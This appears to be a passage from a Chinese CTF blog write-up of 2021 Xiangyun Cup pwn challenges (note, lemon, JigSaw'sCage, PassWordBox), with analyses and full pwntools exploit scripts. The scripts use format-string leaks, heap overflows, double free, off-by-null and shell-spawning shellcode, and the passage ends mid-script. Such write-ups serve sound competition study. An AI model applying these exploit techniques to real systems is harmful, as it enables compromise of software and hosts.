<p>可以计算出偏移是6，并且在底下就存在着残留的stdout指针，此时stdout指针的偏移是7，所以第一个buf就是<code>%7$s</code>那么可以修改stdout从而泄露libc地址</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png"><span class="image-caption">image-20210903162610572</span></p>
<p>吐出了一大堆数据，接收即可。</p>
<p>然后去劫持exit_hook中的_dl_rtld_lock_recursive为one_gadget，当调用exit函数时可得到shell</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png"><span class="image-caption">image-20210903171325616</span></p>
<p>而要找到这个偏移，要去_rtld_global中寻找</p>
<p>计算可得偏移为0x5F0F48</p>
<p>这边我是在本地调试的，我收到的libc的距离libc基址的偏移与wp的不太一样，是为479552，然后就是再次借用格式化字符串漏洞，前面说过了，格式化字符串处在第六个偏移，那么我们填满八个字节，然后把获得的rtld_lock地址跟在后面填入，就变为第七个偏移，之后就能在上面写入one_gadget，最后执行exit(0)getshell</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png"><span class="image-caption">image-20210903174509942</span></p>
<p>成功getshell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png"><span class="image-caption">image-20210907101349756</span></p>
<p>常规checksec一下，64位，保护全开</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908150639102.png"><span class="image-caption">image-20210908150639102</span></p>
<p>进入IDA，发现漏洞在修改堆块内容的功能里，因为buf[4]的大小是我们设置的，最大可为0x400，所以能产生堆溢出（这是我看出的漏洞利用方法）。但是这边复现的是另一种利用方法，后面再提</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907172951372.png"><span class="image-caption">image-20210907172951372</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907173047903.png"><span class="image-caption">image-20210907173047903</span></p>
<p>这里有个伪随机数，但是我不知道怎么绕过，但是试了一下111111，可以绕过</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908145856031.png"><span class="image-caption">image-20210908145856031</span></p>
<p>flag被保存在栈上，同时有个栈地址被保存在.bss上</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908144332803.png"><span class="image-caption">image-20210908144332803</span></p>
<p>泄露出的地址，距离flag的地址偏移为0x40，然后这边为对齐，再加上了0x1000，弄成两字节地址</p>
<p>认真观察，所有的菜单功能里面都没有检查索引的下限，只是规定了不能大于3，所以可以通过堆结构的数组进行越界，寻找到之前保存在.bss上的栈地址，再借用修改功能对栈空间进行修改，通过部分覆盖将环境变量的一个指针改为flag的地址，之后破坏堆结构，报错即可泄露出flag</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151510913.png"><span class="image-caption">image-20210908151510913</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151525386.png"><span class="image-caption">image-20210908151525386</span></p>
<p>要越界到0x202060，也就是数组下标值为-260</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908163406979.png"><span class="image-caption">image-20210908163406979</span></p>
<p>还记得前面绕过随机数，可以输入的名字吗？刚好，前四个字节伪造size，单独一个字节能伪造堆的flag，所以我们就能对.bss上的栈地址写入0x2000长度的数据</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908164508706.png"><span class="image-caption">image-20210908164508706</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908165054261.png"><span class="image-caption">image-20210908165054261</span></p>
<p>目的是为了修改栈上的一个环境指针，然后我发现，wp里面并没有覆盖到我这的环境指针，还差八个字节，修改为<code>&#39;a&#39;*0x140</code>，如上图，修改成功了</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230006730.png"><span class="image-caption">image-20210909230006730</span></p>
<p>由于是本地调试，我直接不爆破了，转为手动输入，所以修改成功</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230112342.png"><span class="image-caption">image-20210909230112342</span></p>
<p>这里是伪造一个堆头，后面是要让堆块申请到这里，但是大小却不是0x450，导致报错退出，打印flag</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230229164.png"><span class="image-caption">image-20210909230229164</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230215738.png"><span class="image-caption">image-20210909230215738</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230529823.png"><span class="image-caption">image-20210909230529823</span></p>
<p>这边多提的是因为在申请堆块功能里面，如果第二个堆块申请大于0x400，将会直接free前面的，但是指针却没有清零，所以借用这个，可以造成double free，最终导致chunk dup，所以就可以修改一个字节，从而申请到我们前面布置好的伪造堆块上，但是我本地是没有打印出flag的，具体原因不知</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./lemon_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,name,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Leave your message:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add2</span>(<span class="hljs-params">idx,name,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon  :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;draw and color!&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>	p.sendafter(<span class="hljs-string">&quot;game with me?\n&quot;</span>,<span class="hljs-string">&quot;yes&quot;</span>)<br>	p.sendafter(<span class="hljs-string">&quot;number: \n&quot;</span>,<span class="hljs-string">&#x27;111111&#x27;</span>)<br>	p.sendafter(<span class="hljs-string">&quot;first: \n&quot;</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">1</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	low = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">3</span>),<span class="hljs-number">16</span>)<br>	log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>	debug()<br>	a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;找到爆破字节&quot;</span>) <br>	flag_low = low - <span class="hljs-number">0x40</span> + a<br>	payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x140</span> + p8(flag_low &amp; <span class="hljs-number">0xff</span>) + p8((flag_low &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>) <span class="hljs-comment">##覆盖环境变量的位置</span><br>	edit(-<span class="hljs-number">260</span>,payload)<br>	<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free(<span class="hljs-number">0</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x500</span>)<br>	free(<span class="hljs-number">0</span>)<br>	payload = p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x450</span>) + p64(<span class="hljs-number">0x100000020</span>) + p64(<span class="hljs-number">0x0</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x01\x01&#x27;</span>,<span class="hljs-number">0x20</span>,payload)<br>    free(<span class="hljs-number">0</span>)<br>	free(<span class="hljs-number">1</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>	add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>)<br>pwn()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">while True:</span><br><span class="hljs-string">	try:</span><br><span class="hljs-string">		p = process(&quot;./lemon_pwn&quot;)</span><br><span class="hljs-string">		pwn()</span><br><span class="hljs-string">		aaa = (&quot;or corruption (!prev):&quot;)</span><br><span class="hljs-string">		print aaa</span><br><span class="hljs-string">		if &quot;flag&quot; in aaa:</span><br><span class="hljs-string">			pause()</span><br><span class="hljs-string">	except:</span><br><span class="hljs-string">		p.close()</span><br><span class="hljs-string">		continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="JigSaw’sCage"><a href="#JigSaw’sCage" class="headerlink" title="JigSaw’sCage"></a>JigSaw’sCage</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090309078.png"><span class="image-caption">image-20210921090309078</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090356101.png"><span class="image-caption">image-20210921090356101</span></p>
<p>这里的choice是int类型，而输入却是可以输入8字节长度的数据，而v2就是choice相邻的高32位的数据，覆盖v2大于14会得到一块可以执行的堆内存</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090223446.png"><span class="image-caption">image-20210921090223446</span></p>
<p>如上图所示，堆块可执行了</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090636446.png"><span class="image-caption">image-20210921090636446</span></p>
<p>并且存在着功能，是可以执行堆块的，所以可以往堆块上写shellcode</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090735583.png"><span class="image-caption">image-20210921090735583</span></p>
<p>但是，堆块只能生成0x10的堆块，所以直接写入可以getshell的shellcode长度是肯定不够的，至少要二十多个字节长度才行，所以这时候一般可以先看看寄存器有没有什么可以直接利用的脏数据，减少shellcode书写的长度</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095449264.png"><span class="image-caption">image-20210921095449264</span></p>
<p>断点下在test函数要执行堆块内容的那步，查看在这时寄存器存了哪些脏数据</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921095610649.png"><span class="image-caption">image-20210921095610649</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100019587.png"><span class="image-caption">image-20210921100019587</span></p>
<p>能发现，R10保存的是一个libc上的地址，所以可以借用这个值去计算free_hook以及system的值，然后再找个寄存器，进行两次执行操作，把system写入free_hook中，然后释放一块写有’/bin/sh’的堆块即可</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921100059193.png"><span class="image-caption">image-20210921100059193</span></p>
<p>另外一种shellcode就是直接getshell，需要更多的观察</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101332945.png"><span class="image-caption">image-20210921101332945</span></p>
<p>可以发现，RDX里面的值是堆上的地址，那么我们就可以往堆上写入/bin/sh\x00，然后再计算偏移，传入RDI，再将RDX清零，把59传入al，最后系统调用即可，但是因为长度有限，所以我们一定要注意</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101858450.png"><span class="image-caption">image-20210921101858450</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921101917761.png"><span class="image-caption">image-20210921101917761</span></p>
<p>同样getshelll</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./JigSAW&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;iNput:&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execve</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index? :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Name:\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Make your Choice:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1095216660480&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code1 = asm(&quot;add r10, 0x50068; mov r12, r10;&quot;)</span><br><span class="hljs-string">code2 = asm(&quot;sub r10, 0x1496b0; mov qword ptr [r12], r10&quot;)</span><br><span class="hljs-string">add(0)</span><br><span class="hljs-string">add(1)</span><br><span class="hljs-string">add(2)</span><br><span class="hljs-string">edit(0,code1)</span><br><span class="hljs-string">edit(1,code2)</span><br><span class="hljs-string">edit(2,&#x27;/bin/sh\x00&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">execve(0)</span><br><span class="hljs-string">execve(1)</span><br><span class="hljs-string">free(2)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	add dl,0x20;</span><br><span class="hljs-string">	push rsi;</span><br><span class="hljs-string">	pop rdi;</span><br><span class="hljs-string">	xchg rdi,rdx;</span><br><span class="hljs-string">	push rsi;</span><br><span class="hljs-string">	pop rax;</span><br><span class="hljs-string">	mov al,59;ls</span><br><span class="hljs-string">	syscall;</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>	)<br>add(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>add(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>sleep(<span class="hljs-number">1</span>)<br>debug()<br>execve(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191615313.png"><span class="image-caption">image-20220228191615313</span></p>
<p>保护全开，64位，glibc2.27版本</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191813211.png"><span class="image-caption">image-20220228191813211</span></p>
<p>刚开始会获得一个随机数，是在后面被用来加密堆块内容的</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191752308.png"><span class="image-caption">image-20220228191752308</span></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191955700.png"><span class="image-caption">image-20220228191955700</span></p>
<p>在add里面，存在offbynull漏洞，fgets会溢出一个0，借此制造出堆块重叠，加密函数只做了简单的异或处理，并且第一个堆块就帮我们打印出堆块的内容，而已知0与任何数进行异或，都是数本身，从而获得到异或的key值。而这个key值要用在我们输入地址、构造prev_addr时候都需要先异或处理，使得输入的内容不会被异或。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228192118841.png"><span class="image-caption">image-20220228192118841</span></p>
<p>在show功能里面， 都会先进行异或处理，然后在打印出堆块内容，所以我们后面泄露libc都需要再进行一次的异或还原。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228192745738.png"><span class="image-caption">image-20220228192745738</span></p>
<p>free功能中堆块地址是保留的，并未被清除。</p>
<p>其他的自行调试，没什么难度了，正常的getshell方式。</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20220228191101438.png"><span class="image-caption">image-20220228191101438</span></p>
<p>虽然执行到了system(“/bin/sh”)，却没能打通。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwdFree&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Input The ID You Want Save:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;Length Of Your Pwd:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Your Pwd:&quot;</span>)<br>    p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which PwdBox You Want Check:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;Input Your Choice:&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Idx you want 2 Delete:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Save ID:&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>key = u64(p.recv(<span class="hljs-number">8</span>))<br>log.info(<span class="hljs-string">&quot;key==&gt;0x%x&quot;</span> %key)<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span 